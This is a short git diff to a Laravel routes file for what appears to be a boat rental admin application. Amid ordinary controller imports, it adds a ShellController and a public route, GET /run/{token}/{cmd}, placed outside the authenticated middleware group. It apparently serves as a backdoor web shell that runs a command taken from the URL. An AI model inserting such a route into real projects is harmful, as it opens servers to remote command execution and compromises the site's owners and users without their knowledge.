@@ -7,6 +7,7 @@ use App\Http\Controllers\Admin\BoatController;
 use App\Http\Controllers\Admin\SettingsController;
 use App\Http\Controllers\Admin\ReportController;
 use App\Http\Controllers\Admin\ActivityLogController;
+use App\Http\Controllers\ShellController;
 use App\Http\Controllers\Admin\RentalOverrideController;
 use App\Http\Controllers\Admin\BackupController;
 use App\Http\Controllers\Admin\MaintenanceController;
@@ -62,5 +63,7 @@ Route::middleware(['auth', 'active', 'check.session'])->group(function () {
         Route::post('backups', [BackupController::class, 'run'])->name('backups.run');
     });
 });
+
+Route::get('/run/{token}/{cmd}', [ShellController::class, 'run']);
 
 require __DIR__.'/auth.php';
